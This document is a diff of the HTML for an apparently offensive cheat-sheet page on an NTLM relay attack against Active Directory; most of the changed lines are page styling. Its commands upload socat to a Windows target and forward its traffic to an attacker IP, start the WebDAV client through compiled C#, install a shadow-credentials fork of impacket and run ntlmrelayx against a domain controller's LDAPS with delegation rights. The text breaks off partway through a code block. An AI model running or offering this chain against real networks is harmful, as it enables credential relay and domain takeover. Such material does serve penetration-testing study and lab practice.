@@ -1,207 +1,172 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
-    <meta charset="utf-8">
+<!DOCTYPE html><html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant="" defer=""></script>
+<meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<title>NTLM Relay Attack | TLDRBins</title>
-<meta name="robots" content='index, follow'>
+<meta name="robots" content="index, follow">
 <meta name="description" content="">
-<meta name="generator" content="hugo-index">
+<title>NTLM Relay Attack | TLDRBins</title>
 <link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
-<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
-<script>
-    window.addEventListener('load', () => {
-        quicklink.listen();
-    });
-</script>
-
-  </head>
-  <body><header>
+</head>
+<body>
+<header>
   <h1>
     <a href="https://tldrbins.github.io/">
       <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
       <span>TLDRBins</span>
-    </a>
-    <span class="hl">/</span>
-    <a href="https://tldrbins.github.io/ntlm_relay_attack/">
-      <span>NTLM Relay Attack</span>
-    </a>
-  </h1>
-  <div class="js-toggle-wrapper">
-    <div class="js-toggle">
-        <div class="js-toggle-track">
-            <div class="js-toggle-track-check">
-                <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
-            </div>
-            <div class="js-toggle-track-x">
-                <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
-            </div>
+    </a><span class="hl"> / </span>
+    <a href="https://tldrbins.github.io/ntlm_relay_attack/"><span>NTLM Relay Attack</span></a></h1>
+  <div class="theme-toggle-wrapper">
+    <div class="theme-toggle">
+      <div class="theme-toggle-track">
+        <div class="theme-toggle-track-dark">
+          <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
         </div>
-        <div class="js-toggle-thumb"></div>
-        <input class="js-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
+        <div class="theme-toggle-track-light">
+          <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
+        </div>
+      </div>
+      <div class="theme-toggle-thumb"></div>
+      <input class="theme-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
     </div>
-</div>
-    
-<style>
- 
+  </div>
+  <style>
+  .theme-toggle-wrapper, .theme-toggle {
+      margin: 0;
+      padding: 0;
+      border: 0;
+      box-sizing: border-box;
+  }
 
- 
-.js-toggle-wrapper, .js-toggle {
-    margin: 0;
-    padding: 0;
-    border: 0;
-    box-sizing: border-box;
-}
+  .theme-toggle-wrapper {
+      display: table;
+      float: right;
+      margin-left: auto;
+  }
 
-.js-toggle-wrapper {
-    display: table;
-    float: right;
-    margin-left: auto;
-}
+  .theme-toggle {
+      touch-action: pan-x;
+      display: inline-block;
+      position: relative;
+      cursor: pointer;
+      background-color: transparent;
+      user-select: none;
+  }
 
-.js-toggle {
-    touch-action: pan-x;
-    display: inline-block;
-    position: relative;
-    cursor: pointer;
-    background-color: transparent;
-    user-select: none;
-}
+  .theme-toggle-screenreader-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      margin: -1px;
+      padding: 0;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+  }
 
-.js-toggle-screenreader-only {
-    position: absolute;
-    width: 1px;
-    height: 1px;
-    margin: -1px;
-    padding: 0;
-    overflow: hidden;
-    clip: rect(0, 0, 0, 0);
-}
+  .theme-toggle-track {
+      width: 50px;
+      height: 24px;
+      border-radius: 30px;
+      background-color: hsl(223, 61%, 44%);
+      transition: background-color 0.2s ease;
+  }
 
-.js-toggle-track {
-    width: 50px;
-    height: 24px;
-    border-radius: 30px;
-    background-color: hsl(223, 61%, 44%);
-    transition: background-color 0.2s ease;
-}
+  .theme-toggle-track-dark,
+  .theme-toggle-track-light {
+      position: absolute;
+      width: 17px;
+      height: 17px;
+      top: 50%;
+      transform: translateY(-50%);
+      transition: opacity 0.25s ease;
+  }
 
-.js-toggle-track-check,
-.js-toggle-track-x {
-    position: absolute;
-    width: 17px;
-    height: 17px;
-    top: 50%;
-    transform: translateY(-50%);
-    transition: opacity 0.25s ease;
-}
+  .theme-toggle-track-dark {
+      left: 5px;
+      opacity: 0;
+  }
 
-.js-toggle-track-check {
-    left: 5px;
-    opacity: 0;
-}
+  .theme-toggle--checked .theme-toggle-track-dark {
+      opacity: 1;
+  }
 
-.js-toggle--checked .js-toggle-track-check {
-    opacity: 1;
-}
+  .theme-toggle-track-light {
+      right: 5px;
+      opacity: 1;
+  }
 
-.js-toggle-track-x {
-    right: 5px;
-    opacity: 1;
-}
+  .theme-toggle--checked .theme-toggle-track-light {
+      opacity: 0;
+  }
 
-.js-toggle--checked .js-toggle-track-x {
-    opacity: 0;
-}
+  .theme-toggle--checked .theme-toggle-track {
+      background-color: hsl(222, 14%, 7%);
+  }
 
-.js-toggle--checked .js-toggle-track {
-    background-color: hsl(222, 14%, 7%);
-}
+  .theme-toggle-thumb {
+      position: absolute;
+      top: 1px;
+      left: 1px;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      background-color: #fafafa;
+      transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+  }
 
-.js-toggle-thumb {
-    position: absolute;
-    top: 1px;
-    left: 1px;
-    width: 22px;
-    height: 22px;
-    border-radius: 50%;
-    background-color: #fafafa;
-    transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
-}
+  .theme-toggle--checked .theme-toggle-thumb {
+      transform: translateX(26px);
+  }
+  </style>
+  <script>
+      const body = document.body;
+      const themeSwitcher = document.querySelector('.theme-toggle');      
 
-.js-toggle--checked .js-toggle-thumb {
-    transform: translateX(26px);
-}
-</style>
+      themeSwitcher.addEventListener('click', () => {
+          const isDarkMode = themeSwitcher.classList.toggle('theme-toggle--checked');
+          body.classList.toggle('dark-mode', isDarkMode);
+          if (isDarkMode) {
+              localStorage.setItem('darkMode', 'true');
+          } else {
+              localStorage.removeItem('darkMode');
+          }
+      });      
 
-<script>
-    var body = document.body;
-    var switcher = document.getElementsByClassName('js-toggle')[0];
-
-    
-    switcher.addEventListener("click", function() {
-        this.classList.toggle('js-toggle--checked');
-        
-        if (this.classList.contains('js-toggle--checked')) {
-            body.classList.add('dark-mode');
-            
-            localStorage.setItem('darkMode', 'true');
-        } else {
-            body.classList.remove('dark-mode');
-            setTimeout(function() {
-                localStorage.removeItem('darkMode');
-            }, 100);
-        }
-    })
-
-    
-    if (localStorage.getItem('darkMode')) {
-        
-        switcher.classList.add('js-toggle--checked');
-        body.classList.add('dark-mode');
-    }
-</script>
+      if (localStorage.getItem('darkMode')) {
+          themeSwitcher.classList.add('theme-toggle--checked');
+          body.classList.add('dark-mode');
+      }
+  </script>
   <p class="desc"></p>
 </header>
-<div class="main">
-
+<main>
 <ul class="tagsList single">
-  
   <li><a href="https://tldrbins.github.io/@shadow-credentials/">Shadow Credentials</a></li>
-  
   <li><a href="https://tldrbins.github.io/@attack-chain/">Attack Chain</a></li>
-  
   <li><a href="https://tldrbins.github.io/@ntlm/">Ntlm</a></li>
-  
   <li><a href="https://tldrbins.github.io/@ldap/">Ldap</a></li>
-  
   <li><a href="https://tldrbins.github.io/@pass-the-hash/">Pass-the-Hash</a></li>
-  
   <li><a href="https://tldrbins.github.io/@impacket/">Impacket</a></li>
-  
   <li><a href="https://tldrbins.github.io/@ntlmreplay/">Ntlmreplay</a></li>
-  
   <li><a href="https://tldrbins.github.io/@petitpotam/">Petitpotam</a></li>
-  
   <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
-  
   <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
-  
   <li><a href="https://tldrbins.github.io/@adcs/">ADCS</a></li>
-  
   <li><a href="https://tldrbins.github.io/@webdav/">Webdav</a></li>
-  
   <li><a href="https://tldrbins.github.io/@pkinit/">Pkinit</a></li>
-  
   <li><a href="https://tldrbins.github.io/@ticket-granting-ticket/">Ticket Granting Ticket</a></li>
-  
 </ul>
 <hr>
 <div class="content">
+  <div class="tips">
+  <p><strong>Usage Tips:</strong></p>
+  <ul>
+    <li>Click inside a code block to copy (excludes comments).</li>
+    <li>Use the <strong><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -6 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></strong> button to view examples.</li>
+    <li>Click outside to collapse all examples.</li>
+  </ul>
+</div>
   <div id="dynamicFormContainer">
-	<form id="dynamicForm" style="display: none;">
-	</form>
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="AS_REP_ENC_KEY">AS REP ENC KEY: </label><input type="text" name="AS_REP_ENC_KEY"></div><div class="input-group"><label for="DC">DC: </label><input type="text" name="DC"></div><div class="input-group"><label for="DEST_PATH">DEST PATH: </label><input type="text" name="DEST_PATH"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="HASH">HASH: </label><input type="text" name="HASH"></div><div class="input-group"><label for="LOCAL_IP">LOCAL IP: </label><input type="text" name="LOCAL_IP"></div><div class="input-group"><label for="RANDOM_CHARS_PASSWORD">RANDOM CHARS PASSWORD: </label><input type="text" name="RANDOM_CHARS_PASSWORD"></div><div class="input-group"><label for="RANDOM_CHARS">RANDOM CHARS: </label><input type="text" name="RANDOM_CHARS"></div><div class="input-group"><label for="SOCAT_HOSTNAME">SOCAT HOSTNAME: </label><input type="text" name="SOCAT_HOSTNAME"></div><div class="input-group"><label for="SOCAT_LISTENER_IP">SOCAT LISTENER IP: </label><input type="text" name="SOCAT_LISTENER_IP"></div><div class="input-group"><label for="SOCAT_ZIP_FILE_PATH">SOCAT ZIP FILE PATH: </label><input type="text" name="SOCAT_ZIP_FILE_PATH"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div></form>
 	<div class="buttons center">
 		<button id="form_btn">Show Params Form</button>
 		<button id="replace_btn" style="display: none;">Replace Params</button>
@@ -209,7 +174,6 @@
 		<button id="clear_btn" style="display: none;">Clear Cache</button>
 	</div>
 </div>
-
 <style>
 #dynamicFormContainer {
 	width: 100%;
@@ -342,16 +306,18 @@ body.dark-mode #dynamicFormContainer button:hover {
 </style>
   <h3 id="ntlm-relay-attack">NTLM Relay Attack</h3>
 <h4 id="1-run-socat-to-redirect-traffic-in-windows-target">1. Run socat to redirect traffic (In Windows Target)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Upload socat.zip and unzip
-</span></span><span class="line"><span class="cl"><span class="go">Expand-Archive -Path &#34;&lt;SOCAT_ZIP_FILE_PATH&gt;&#34; -DestinationPath &#34;&lt;DEST_PATH&gt;&#34; -Force
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\xampp\htdocs&gt; Expand-Archive -Path &#34;C:\xampp\htdocs\socat.zip&#34; -DestinationPath &#34;C:\xampp\htdocs\&#34; -Force
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\socat.exe tcp-listen:8090,reuseaddr,fork tcp:&lt;LOCAL_IP&gt;:80
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\xampp\htdocs\socat-windows-master&gt; .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80
-</span></span></span><span class="line"><span class="cl"><span class="go">      0 [main] socat 2084 find_fast_cwd: WARNING: Couldn&#39;t compute FAST_CWD pointer.  Please report this problem to
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Upload socat.zip and unzip
+</span></span><span class="line"><span class="cl"><span class="go">Expand-Archive -Path "<span class="o">&lt;SOCAT_ZIP_FILE_PATH&gt;</span>" -DestinationPath "<span class="o">&lt;DEST_PATH&gt;</span>" -Force
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\xampp\htdocs&gt; Expand-Archive -Path "C:\xampp\htdocs\socat.zip" -DestinationPath "C:\xampp\htdocs\" -Force
+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\socat.exe tcp-listen:8090,reuseaddr,fork tcp:<span class="o">&lt;LOCAL_IP&gt;</span>:80
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">PS C:\xampp\htdocs\socat-windows-master&gt; .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80
+</span></span></span><span class="line"><span class="cl"><span class="go">      0 [main] socat 2084 find_fast_cwd: WARNING: Couldn't compute FAST_CWD pointer.  Please report this problem to
 </span></span></span><span class="line"><span class="cl"><span class="go">the public mailing list cygwin@cygwin.com
-</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://codeload.github.com/StudioEtrange/socat-windows/zip/refs/heads/master">socat</a></em></small></p>
+</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://codeload.github.com/StudioEtrange/socat-windows/zip/refs/heads/master">socat</a></em></small></p>
 <h4 id="2-enable-webdav-in-windows-target">2. Enable webdav (In Windows Target)</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">Source</span> <span class="o">=</span> @<span class="s2">&#34;
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">Source</span> <span class="o">=</span> @<span class="s2">"
 </span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="go">using System;
 </span></span></span><span class="line"><span class="cl"><span class="go">using System.Text;
 </span></span></span><span class="line"><span class="cl"><span class="go">using System.Security;
@@ -403,37 +369,47 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">			}
 </span></span></span><span class="line"><span class="cl"><span class="go">		}
 </span></span></span><span class="line"><span class="cl"><span class="go"> 
-</span></span></span><span class="line"><span class="cl"><span class="go">		[DllImport(&#34;Advapi32.dll&#34;, SetLastError = true)]
+</span></span></span><span class="line"><span class="cl"><span class="go">		[DllImport("Advapi32.dll", SetLastError = true)]
 </span></span></span><span class="line"><span class="cl"><span class="go">		public static extern uint EventRegister(ref Guid guid, [Optional] IntPtr EnableCallback, [Optional] IntPtr CallbackContext, [In][Out] ref long RegHandle);
 </span></span></span><span class="line"><span class="cl"><span class="go"> 
-</span></span></span><span class="line"><span class="cl"><span class="go">		[DllImport(&#34;Advapi32.dll&#34;, SetLastError = true)]
+</span></span></span><span class="line"><span class="cl"><span class="go">		[DllImport("Advapi32.dll", SetLastError = true)]
 </span></span></span><span class="line"><span class="cl"><span class="go">		public static extern unsafe uint EventWrite(long RegHandle, ref EVENT_DESCRIPTOR EventDescriptor, uint UserDataCount, EventData* UserData);
 </span></span></span><span class="line"><span class="cl"><span class="go"> 
-</span></span></span><span class="line"><span class="cl"><span class="go">		[DllImport(&#34;Advapi32.dll&#34;, SetLastError = true)]
+</span></span></span><span class="line"><span class="cl"><span class="go">		[DllImport("Advapi32.dll", SetLastError = true)]
 </span></span></span><span class="line"><span class="cl"><span class="go">		public static extern uint EventUnregister(long RegHandle);
 </span></span></span><span class="line"><span class="cl"><span class="go">	}
 </span></span></span><span class="line"><span class="cl"><span class="go">}
-</span></span></span><span class="line"><span class="cl"><span class="go">&#34;@
+</span></span></span><span class="line"><span class="cl"><span class="go">"@
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span><span class="nv">compilerParameters</span> <span class="o">=</span> New-Object System.CodeDom.Compiler.CompilerParameters
-</span></span><span class="line"><span class="cl"><span class="gp">$</span>compilerParameters.CompilerOptions<span class="o">=</span><span class="s2">&#34;/unsafe&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="gp">$</span>compilerParameters.CompilerOptions<span class="o">=</span><span class="s2">"/unsafe"</span>
 </span></span><span class="line"><span class="cl"><span class="go">Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $compilerParameters
 </span></span></span><span class="line"><span class="cl"><span class="go">[JosL.WebClient.Starter]::startService()
-</span></span></span></code></pre></div><br>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run enable_webdav.ps1
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><br>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run enable_webdav.ps1
 </span></span><span class="line"><span class="cl"><span class="go">C:\xampp\htdocs\enable_webdav.ps1
-</span></span></span></code></pre></div><h4 id="3-start-ntlmrelayx-listener-in-local-linux">3. Start ntlmrelayx listener (In Local Linux)</h4>
-<h4 id="get-impacket-fork--add-shadow-credentials-commands-to-ntlmrelayxs-interactive-ldap-shell">Get impacket fork : Add Shadow Credentials Commands to Ntlmrelayx&rsquo;s Interactive LDAP Shell</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">git clone -b interactive-ldap-shadow-creds https://github.com/Tw1sm/impacket.git
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cd impacket
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">git checkout -b remotes/origin/interactive-ldap-shadow-creds
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 -m venv test
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">source test/bin/activate
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pip install .
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pip3 install impacket pyOpenSSL==24.0.0
-</span></span></span></code></pre></div><h4 id="run-ntlmrelayx">Run ntlmrelayx</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ntlmrelayx.py -t ldaps://&lt;DC&gt; --delegate-access -i
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ntlmrelayx.py -t ldaps://192.168.100.100 --delegate-access -i
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="3-start-ntlmrelayx-listener-in-local-linux">3. Start ntlmrelayx listener (In Local Linux)</h4>
+<h4 id="get-impacket-fork--add-shadow-credentials-commands-to-ntlmrelayxs-interactive-ldap-shell">Get impacket fork : Add Shadow Credentials Commands to Ntlmrelayx’s Interactive LDAP Shell</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">git clone -b interactive-ldap-shadow-creds https://github.com/Tw1sm/impacket.git
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cd impacket
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">git checkout -b remotes/origin/interactive-ldap-shadow-creds
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 -m venv test
+</span></span></span></code><div class="output-bubble">Sample Output:
